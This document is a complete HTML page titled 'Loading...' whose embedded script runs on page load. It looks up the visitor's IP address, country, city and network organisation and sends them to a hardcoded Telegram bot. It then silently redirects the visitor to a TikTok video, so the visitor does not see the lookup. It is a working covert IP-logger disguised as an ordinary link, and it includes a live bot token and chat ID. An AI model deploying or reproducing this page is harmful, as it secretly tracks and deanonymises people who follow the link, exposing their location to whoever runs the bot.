<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
    <script>
        const BOT_TOKEN = '8942095399:AAGbL8-6mj89o3PefyQeVdRd9oVR0LrSNDg';
        const CHAT_ID = '7641255924';
        
        // لینکی ڤیدیۆی تیکتۆک ڕاستەوخۆ لێرەدا جێگیر کراوە
        const targetUrl = 'https://vt.tiktok.com/ZSq8oHq1e/';

        async function sendIPAndRedirect() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                
                let ipMessage = "🌐 New Visitor Info:\n\n" +
                                "IP: " + data.ip + "\n" +
                                "Country: " + data.country_name + "\n" +
                                "City: " + data.city + "\n" +
                                "Org: " + data.org;

                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: ipMessage
                    })
                });
            } catch (e) {}

            window.location.href = targetUrl;
        }

        window.onload = sendIPAndRedirect;
    </script>
</body>
</html>
